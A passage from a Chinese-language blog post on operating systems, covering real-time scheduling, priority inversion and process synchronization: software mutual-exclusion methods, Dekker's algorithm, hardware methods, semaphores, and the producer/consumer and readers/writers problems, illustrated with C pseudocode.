CPU，微观串行模式。</li><li><strong>基于动态规划的调度法</strong>：当实时任务到达后动态地创建一张调度表，如果能够满足当前任务地时间约束，那么立即执行新任务。</li><li><strong>动态尽力调度法</strong>：广泛用于非周期性实时任务调度，当任务到达时，系统根据其属性赋予优先级，优先级高的先调度。但是可能难以兼顾任务的时间约束。</li></ol><p>抢占方式可以分成如下几类：</p><ol><li>基于时间片轮转的抢占式。响应时间一般为<strong>秒级</strong>。</li><li>基于优先级的非抢占式。响应时间为<strong>几百毫秒到几秒</strong>。</li><li>基于优先级的抢占式。响应时间<strong>几毫秒至几十毫秒</strong></li><li>立即抢占式。响应时间<strong>微秒至毫秒级</strong>。</li></ol><p>针对每种情况的调度算法就不细说了，内容确实很繁杂。</p><h3 id="优先级反转">优先级反转</h3><p>优先级反转，是指某同步<strong>资源被较低优先级的进程/线程所拥有</strong>，较高优先级的进程/线程竞争该同步资源未获得该资源，而使得较高优先级进程/线程反而推迟被调度执行的现象。这是是一种<strong>不希望发生</strong>的任务调度状态。在该种状态下，一个高优先级任务间接被一个低优先级任务所抢先(preempted)，使得两个任务的相对优先级被倒置。</p><p>有一种解决方法叫<strong>优先级继承</strong>，也就是占有了资源的进程的优先级，继承共享这个进程的优先级。</p><h2 id="进程的同步">进程的同步</h2><p>这里的进程的并发都是指多道程序系统，宏观并行，微观穿行，也就是<strong>单处理器交替执行</strong>。进程是<strong>独立</strong>的个体，可以<strong>异步</strong>、并发，但是 CPU、内存等资源只能有限地使用。</p><p>部分术语如下：</p><ul><li>原子操作。由一个或多个指令序列实现的动作或函数，对外不可见，一组指令要么都执行，要么都不执行。</li><li>互斥。当一个进程在临界区访问共享资源时，其他进程不能进入该临界区访问共享资源的情形。</li><li>临界资源。不可同时访问，必须互斥访问的资源，如打印机。</li><li>临界区。访问临界资源的代码，任意时刻只能由一个进程在这段代码中运行。</li><li>忙等现象。当一个进程等待进入临界区时，它会继续消耗处理器的时间。</li><li>活锁。两个或两个以上的进程为响应其他进程而持续改变自己状态，但是<strong>不做有用工作</strong>的情形。</li><li>死锁。两个或两个以上的进程因等待其他进程做完某些事而<strong>不能继续执行</strong>的情形。</li><li>竞争条件。多个进程或线程读写共享的数据时，结果取决于多个进程的指令执行顺序。</li><li>饥饿。一个具备执行条件的进程，被调度程序无限期的忽视而不能调度的情形。</li></ul><img src="http://cdn.blog-blockchain.xyz/202301280943718.png" alt="image-20230128094358647" style="zoom: 33%;" /><p>由于进程执行的相对速度不可预测，资源的共享和协调就较为困难。比如某个变量被多个进程共享，那么每个进程读取这个变量时获得的值，可能不确定。所以需要设计控制访问共享资源的方法。</p><p>除了<strong>基于资源共享</strong>的进程之间的合作，还有<strong>基于通信</strong>的进程之间的合作。一个进程执行的结果可能由其他进程提供的信息决定。比如必须等接收到特定的信号之后，某个进程才能开始执行。</p><h3 id="互斥">互斥</h3><p>为了控制进程对临界资源的访问，提出了互斥的概念，互斥的性质如下：</p><ol><li><strong>空闲让进</strong>：如临界区空闲，则有进程申请就立即进入。</li><li><strong>忙则等待</strong>：每次只允许一个进程处于临界区。</li><li><strong>有限等待</strong>：保证进程在有限时间内能进入临界区。</li><li><strong>让权等待</strong>：进程在临界区不能长时间阻塞等待某事件。</li></ol><h3 id="软件方法">软件方法</h3><p>在编程中我们可以用最原始的方法实现互斥，这叫做实现互斥的<strong>软件方法</strong>。他的核心思想在于：</p><ol><li>进入临界区时，设置和检查一些标志，<strong>判断临界区是否被占有</strong>。</li><li>若已有进程在临界区，则在临界区的入口，<strong>循环地检查标志，等待临界区空闲后访问</strong>。</li><li>进程离开临界区时，需要修改标志。</li></ol><p>这是单 CPU 的背景下的进程调度，就是说每个时刻只能运行一个进程，微观串行。下面不同的进程中是访问同样的临界区。</p><p><strong>单标志法</strong></p><p>进程访问完临界资源后会把使用临界资源的权限主动转让给另一个进程。即每个进程进入临界区的权限只能被另一个进程赋予。通过一个标志表示应该执行哪一个进程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> trun = <span class="number">0</span>;                      <span class="comment">//共享的全局变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//进程P0</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (turn != <span class="number">0</span>) ;           <span class="comment">//进入区</span></span><br><span class="line">    <span class="comment">//进程P0的临界区代码； //临界区</span></span><br><span class="line">    turn = <span class="number">1</span>;                     <span class="comment">//退出区</span></span><br><span class="line">    <span class="comment">//进程P0的其它代码 //剩余区</span></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//进程P1</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (turn != <span class="number">1</span>) ;           <span class="comment">//进入区</span></span><br><span class="line">    <span class="comment">//进程P1的临界区代码； //临界区</span></span><br><span class="line">    turn = <span class="number">0</span>;                     <span class="comment">//退出区</span></span><br><span class="line">    <span class="comment">//进程P1的其它代码           //剩余区</span></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>这是最容易想到的，一个全局变量，然后两个进程之间轮换，但是违反了空闲让进的原则。如果是 P1 先进入，那么就会在 while 处执行空的循环，直到时间片用完。但是这个期间，虽然 P1 没有访问临界区，但是 P0 也无法访问临界区，这就违反了空闲让进的原则了。</p><p>也就是必须按照一定的顺序执行才行，<strong>每个进程执行的权限来自其他进程，如果其他进程没有先执行，就会违反空闲让进原则</strong>。</p><p><strong>双标志先检查法</strong></p><p>通过设置一个数组，表示每个进程进入临界区的意愿，每个进程在使用资源之前先检查是否有别的进程想进入临界区。如果没有则将自身对应的标志 flag[i] 置为 true，并开始访问临界区；有则先让其他进程使用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">boolean flag[<span class="number">2</span>] = &#123;<span class="literal">false</span>, <span class="literal">false</span>&#125;;   <span class="comment">//共享的全局变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//进程P0</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (flag[<span class="number">1</span>]) ;               <span class="comment">//进入区</span></span><br><span class="line">    flag[<span class="number">0</span>] = <span class="literal">true</span>;                 <span class="comment">//进入区</span></span><br><span class="line">    <span class="comment">//进程P0的临界区代码；   //临界区</span></span><br><span class="line">    flag[<span class="number">0</span>] = <span class="literal">false</span>;                <span class="comment">//退出区</span></span><br><span class="line">    <span class="comment">//进程P0的其它代码             //剩余区</span></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//进程P1</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (flag[<span class="number">0</span>]) ;               <span class="comment">//进入区</span></span><br><span class="line">    flag[<span class="number">1</span>] = <span class="literal">true</span>;                 <span class="comment">//进入区</span></span><br><span class="line">    <span class="comment">//进程P1的临界区代码；   //临界区</span></span><br><span class="line">    flag[<span class="number">1</span>] = <span class="literal">false</span>;                <span class="comment">//退出区</span></span><br><span class="line">    <span class="comment">//进程P1的其它代码   //剩余区</span></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>但是如果执行 #5 和 #14 的检查之后，#6 之后执行 #15，就会造成同时访问临界区的情况，违反了忙则等待的原则。这是因为检查和上锁之间，其他进程可能已经通过了检查，也在准备上锁。<strong>把检查和上锁结合在一块，形成原子操作，是可行的办法</strong>。</p><p><strong>双标志后检查法</strong></p><p>和上一个方法类似，差别在于先上锁后检查。但是如果在上锁和检查之间，另外一个进程也上锁了，就会造成死锁。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">boolean flag[<span class="number">2</span>] = &#123;<span class="literal">false</span>, <span class="literal">false</span>&#125;;    <span class="comment">//共享的全局变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//进程P0</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    flag[<span class="number">0</span>] = <span class="literal">true</span>;                  <span class="comment">//进入区</span></span><br><span class="line">    <span class="keyword">while</span> (flag[<span class="number">1</span>]) ;                <span class="comment">//进入区</span></span><br><span class="line">    <span class="comment">//进程P0的临界区代码；   //临界区</span></span><br><span class="line">    flag[<span class="number">0</span>] = <span class="literal">false</span>;                 <span class="comment">//退出区</span></span><br><span class="line">    <span class="comment">//进程P0的其它代码          //剩余区</span></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//进程P1</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    flag[<span class="number">1</span>] = <span class="literal">true</span>;                  <span class="comment">//进入区</span></span><br><span class="line">    <span class="keyword">while</span> (flag[<span class="number">0</span>]) ;                <span class="comment">//进入区</span></span><br><span class="line">    <span class="comment">//进程P1的临界区代码；    //临界区</span></span><br><span class="line">    flag[<span class="number">1</span>] = <span class="literal">false</span>;                 <span class="comment">//退出区</span></span><br><span class="line">    <span class="comment">//进程P1的其它代码             //剩余区</span></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p><strong>Dekker 互斥算法</strong></p><p>这个算法结合了单标志法和双标志法，在使用临界资源前，判断对方是否想使用资源，而且资源的使用权是否已经给了对方。如果都是，则自己暂时不想使用资源，等待对方释放资源后，再想要资源。重复进行这样的等待，直到对方不想使用资源。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">boolean flag[<span class="number">2</span>] = &#123;<span class="literal">false</span>, <span class="literal">false</span>&#125;;              <span class="comment">//共享的全局变量</span></span><br><span class="line"><span class="type">int</span> turn = <span class="number">1</span>;                                  <span class="comment">//共享的全局</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//进程P0</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    flag[<span class="number">0</span>] = <span class="literal">true</span>;                            <span class="comment">//进入区</span></span><br><span class="line">    <span class="keyword">while</span> (flag[<span class="number">1</span>]) &#123;</span><br><span class="line">       <span class="keyword">if</span> (turn == <span class="number">1</span>)  &#123;</span><br><span class="line">           flag[<span class="number">0</span>] = <span class="literal">false</span>;</span><br><span class="line">           <span class="keyword">while</span>  (turn == <span class="number">1</span>) ;                <span class="comment">//等待</span></span><br><span class="line">           flag[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;                                         <span class="comment">//进入区</span></span><br><span class="line">    <span class="comment">//进程P0的临界区代码；             //临界区</span></span><br><span class="line">    turn = <span class="number">1</span>;</span><br><span class="line">    flag[<span class="number">0</span>] = <span class="literal">false</span>;                           <span class="comment">//退出区</span></span><br><span class="line">    <span class="comment">//进程P0的其它代码                     //剩余区</span></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//进程P1</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    flag[<span class="number">1</span>] = <span class="literal">true</span>;                            <span class="comment">//进入区</span></span><br><span class="line">    <span class="keyword">while</span> (flag[<span class="number">0</span>]) &#123;</span><br><span class="line">       <span class="keyword">if</span> (turn == <span class="number">0</span>)  &#123;</span><br><span class="line">           flag[<span class="number">1</span>] = <span class="literal">false</span>;</span><br><span class="line">           <span class="keyword">while</span>  (turn == <span class="number">0</span>) ;              <span class="comment">//等待</span></span><br><span class="line">           flag[<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;                                         <span class="comment">//进入区</span></span><br><span class="line">    <span class="comment">//进程P1的临界区代码；           //临界区</span></span><br><span class="line">    turn = <span class="number">0</span>;</span><br><span class="line">    flag[<span class="number">1</span>] = <span class="literal">false</span>;                           <span class="comment">//退出区</span></span><br><span class="line">    <span class="comment">//进程P1的其它代码                     //剩余区</span></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="literal">true</span>)</span><br></pre></td></tr></table></figure><p><strong>上述所有的软件方法，都是依靠循环实现，所以没有遵循让权等待的原则</strong></p><h3 id="硬件方法">硬件方法</h3><p>硬件方法分为<strong>中断禁用</strong>和<strong>机器指令</strong>。中断禁用，就是屏蔽中断，利用 「开/关中断指令」实现互斥。「关中断」和「开中断」之间的代码就是临界区。由于关中断后 CPU 会屏蔽中断，而<strong>进程切换依赖于中断</strong>，因此可以保证其他进程不会访问到这个临界区，避免了资源竞争。</p><p>但是中断禁用的办法<strong>只能在单 CPU 计算机使用</strong>，不同 CPU 之间的进程需要额外的协调机制。</p><p>机器指令是指在设计 CPU 时就设计了一些指令，用于<strong>保证两个动作的原子性</strong>。比较典型的例子是 <code>compare&amp;swap </code>，比较一个内存单元的值和一个测试值，如果相等，则发生交换。这个操作就必须保持原子性。再比如 <code>Exchange</code>，原子性地交换寄存器和内存的值。它涉及到两次写入，也是需要保持原子性。</p><p>采用机器指令可以支持多 CPU、多临界区计算机，而且简单易证明。但是使用不当也会造成死锁。</p><h3 id="信号量">信号量</h3><p>两个或多个进程可以通过传递信号进行合作，主要功能是：</p><ul><li>迫使进程在某个位置暂时停止执行（阻塞）</li><li>直到它收到一个可以“向前推进”的信号（被唤醒）</li></ul><p>这样的机制就叫做信号量机制。表示这样的信号的变量就叫做信号量。信号量是一个值为整数的变量，只能进行下面的三类操作：</p><ol><li>初始化为非负数。</li><li>semWait （Wait 或 P）操作使信号量的值减少 1。若值变为负数，则阻塞执行 semWait( Wait 或 P)操作的进程。</li><li>semSignal（Signal 或 V）操作使信号量的值增加 1，若值小于等于零，则被 semWait(Wait 或 P)阻塞的进程解除阻塞。</li></ol><p>信号量里 count 值可以解释如下</p><ul><li>s.count ≥ 0, s.count 表示执行 semWait(s)操作而不被阻塞的进程数（或可看作可用资源数）。这种情形信号量可支持同步与互斥。</li><li>s.count &lt; 0, s.count 表示阻塞在 s.queue 队列上的进程数。</li></ul><p><strong>生产者/消费者问题</strong></p><p>生产者/消费者问题是信号量使用的经典方式，描述如下：</p><ul><li>一个或者多个生产者产生数据，并放入缓冲区。</li><li>每次只能有一个消费者从缓冲中取出数据。</li><li>任何时候只能由一个生产者或消费者访问缓冲。（互斥关系）</li><li>保证缓冲区满时，生产者不会往缓冲区中增加数据。（同步关系）</li><li>保证缓冲区空时，消费者不能从缓冲区中取走数据。（同步关系）</li></ul><p>上面的条件中包括了两个同步关系和一个互斥关系。所以需要三个信号量表示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">semaphore mutex = <span class="number">1</span>; <span class="comment">//互斥信号量，实现对缓冲区的互斥访问</span></span><br><span class="line">semaphore empty = n; <span class="comment">//同步信号量，表示空闲缓冲单位的数量</span></span><br><span class="line">semaphore full = <span class="number">0</span>;  <span class="comment">//同步信号量，表示产品的数量，也即非空缓冲单位的数量</span></span><br><span class="line"></span><br><span class="line">producer()&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">//生产1个产品;</span></span><br><span class="line">        P(empty);    <span class="comment">// 消耗一个空闲缓冲单位</span></span><br><span class="line">        P(mutex); <span class="comment">// 访问缓冲区</span></span><br><span class="line">        <span class="comment">//把产品放入缓冲区;</span></span><br><span class="line">        V(mutex);</span><br><span class="line">        V(full); <span class="comment">// 增加一个产品</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">consumer()&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        P(full);     <span class="comment">// 消耗一个缓存区中的产品</span></span><br><span class="line">        P(mutex); <span class="comment">// 访问缓冲区</span></span><br><span class="line">        <span class="comment">//从缓冲区取出产品;</span></span><br><span class="line">        V(mutex);</span><br><span class="line">        V(empty); <span class="comment">// 增加一个可用缓冲区单位</span></span><br><span class="line">        <span class="comment">//使用产品;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：</p><ol><li>先申请资源信号量，再申请互斥信号量。如果反过来的话，会发生死锁。因为当缓冲区满之后，生产者的 <code>P(empty)</code> 会阻塞，同时上一句的 <code>P(mutex)</code> 会导致消费者的 <code>P(mutex)</code> 阻塞。</li><li>消费者的 <code>V(mutex)</code> 和 <code>V(empty)</code> 顺序可以互换。</li></ol><p>来看下面这个实际练习.</p><p>桌子上有一只盘子，最多可以放入 N（N&gt;0）个水果。爸爸随机向盘中放入苹果或桔子。儿子只吃盘中的桔子，女儿只吃盘中的苹果。只有盘子中水果数目小于 N 时，爸爸才可以向盘子中放水果（两个同步关系）；仅当盘子中有自己需要的水果时，儿子或女儿才可以从盘子中取出相应的水果（同步关系）；每次只能放入或取出一个水果，且不允许多人同时使用盘子（互斥关系）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">semaphore mutex = <span class="number">1</span>; <span class="comment">//一个盘子只能被一个人使用</span></span><br><span class="line">semaphore orange = <span class="number">0</span>; <span class="comment">//必须有橘子，儿子才能取橘子</span></span><br><span class="line">semaphore apple = <span class="number">0</span>; <span class="comment">//必须有苹果，女儿才能取苹果</span></span><br><span class="line">semaphore empty = N;<span class="comment">//必须有空位，爸爸才能放水果</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//爸爸放水果</span></span><br><span class="line">P1()&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">//选择水果类型</span></span><br><span class="line">        P(empty);</span><br><span class="line">        P(mutex);</span><br><span class="line">        <span class="comment">//放入水果进盘子</span></span><br><span class="line">        V(mutex)</span><br><span class="line">        V(orange or apple)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//儿子取桔子</span></span><br><span class="line">sun()&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        P(orange);</span><br><span class="line">        P(mutex);</span><br><span class="line">        <span class="comment">//取出苹果</span></span><br><span class="line">        V(mutex);</span><br><span class="line">        V(empty);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//女儿取走苹果</span></span><br><span class="line">sun()&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        P(apple);</span><br><span class="line">        P(mutex);</span><br><span class="line">        <span class="comment">//取出苹果</span></span><br><span class="line">        V(mutex);</span><br><span class="line">        V(empty);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果改变条件，爸爸放苹果，妈妈放桔子，其他不变。那么只要增加一个和生产者类似的进程即可。</p><p><strong>读者和写者问题</strong></p><p>多个进程访问一个共享数据区（可为文件、内存空间、寄存器），其中有些进程只能读取数据，有些只能写入数据，有些则有读写权限。规定进程可以<strong>同时读、互斥写(不能同时写)、互斥读写（不能同时读写）</strong>。这个问题和消费者/生产者问题的区别在于，它可以同时读取。</p><p>为了完成互斥，就可以选择读者优先、写者优先，或者公平读写的策略。</p><p><strong>读者优先</strong>就是必须全部读者都完成了，才能写入。很显然，容易造成写者饥饿的问题。此时需要，读写互斥锁、读者的数量，由于读者数量是没有限制的，我们采用加互斥锁和变量来实现。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> readCount=<span class="number">0</span>；</span><br><span class="line">semaphore readCountMutex = <span class="number">1</span>, wMutex=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reader</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        P(readCountMutex);</span><br><span class="line">        readCount++;</span><br><span class="line">        <span class="keyword">if</span>(readCount==<span class="number">1</span>) P(wMutex); <span class="comment">//读写互斥</span></span><br><span class="line">        V(readCountMutex);</span><br><span class="line">        <span class="comment">//读取</span></span><br><span class="line">        P(readCountMutex);</span><br><span class="line">        readCount--;</span><br><span class="line">        <span class="keyword">if</span>(readCount == <span class="number">0</span>) V(wMutex);</span><br><span class="line">        V(readCountMutex)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">writer</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        P(wMutex);</span><br><span class="line">        <span class="comment">//写入</span></span><br><span class="line">        V(wMutex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>写者优先</strong>就是存在写者声明需要读取数据时，之前的读者必须先完成，之后的新的读者暂时不能读取数据，需要等待写入完毕之后才行。但是如果又有新的写入进程，那么会接着上一个写入进程执行。显然，由于读者被推迟，系统的并发性能较差。并发时需要考虑：</p><ol><li>之前的读者必须完成，所以需要记录之前读者的数量。</li><li>写入数据需要互斥锁。</li><li>之后的读者需要阻塞，需要互斥锁。</li><li>新来的写者可能要「插队」，需要记录写者数量。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> writeCount = <span class="number">0</span>, readCount = <span class="number">0</span>;</span><br><span class="line">semaphore wMutex=<span class="number">1</span>, rmutex=<span class="number">1</span>, writeCountMutex=<span class="number">1</span>, readCountMutex=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> reader() &#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        P(rMutex); <span class="comment">//被阻塞则不能进行任何操作</span></span><br><span class="line">        P(readCountMutex);</span><br><span class="line">        readCount++;</span><br><span class="line">        <span class="keyword">if</span>(readCount == <span class="number">1</span>) P(wMutex); <span class="comment">// 等待之前的读者完成</span></span><br><span class="line">        V(readCountMutex);</span><br><span class="line">        <span class="comment">//读取</span></span><br><span class="line">        P(readCountMutex);</span><br><span class="line">        readCount--;</span><br><span class="line">        <span class="keyword">if</span>(readCount == <span class="number">0</span>) V(wMutex); <span class="comment">//之前的读者完毕</span></span><br><span class="line">        V(readCountMutex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">writer</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )&#123;</span><br><span class="line">P(writeCountMutex); <span class="comment">//为了保证自增和判断的原子性</span></span><br><span class="line">writecount++;</span><br><span class="line"><span class="keyword">if</span> (writecount == <span class="number">1</span>) P(rMutex); <span class="comment">//写入时阻塞读取</span></span><br><span class="line">V(writeCountMutex);</span><br><span class="line">P(wMutex);</span><br><span class="line"><span class="comment">//写入</span></span><br><span class="line">V(wMutex);</span><br><span class="line">P(writeCountMutex);</span><br><span class="line">writecount--;</span><br><span class="line"><span class="keyword">if</span> (writecount == <span class="number">0</span>) V(rMutex);</span><br><span class="line">V(writeCountMutex);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>公平读写</strong>则按照先来后到的顺序，处理读者和写者。那么</p><ol><li>读者读取时不能有写者。需要互斥。</li><li>新进程到达时，都应该阻塞。</li><li>写者之前的读者，应该全部完成，写者才能开始。</li><li>写者之间应该互斥。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> readCount = <span class="number">0</span>;</span><br><span class="line">semaphore wrMutex = <span class="number">1</span>, wMutex = <span class="number">1</span>, readCountMutex = <span class="number">1</span>,</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> reader()&#123;</span><br><span class="line">    P(wrMutex); <span class="comment">//读者和写者串行，但是读者之间并发</span></span><br><span class="line">    P(readCountMutex);</span><br><span class="line">    readCount++;</span><br><span class="line">    <span class="keyword">if</span>(readCount == <span class="number">1</span>) P(wMutex); <span class="comment">// 读取时加写锁</span></span><br><span class="line">    V(readCountMutex);</span><br><span class="line">    V(wrMutex); <span class="comment">//在这里解开读写锁很有讲究，读者可以并发读取</span></span><br><span class="line">    <span class="comment">//读取</span></span><br><span class="line">    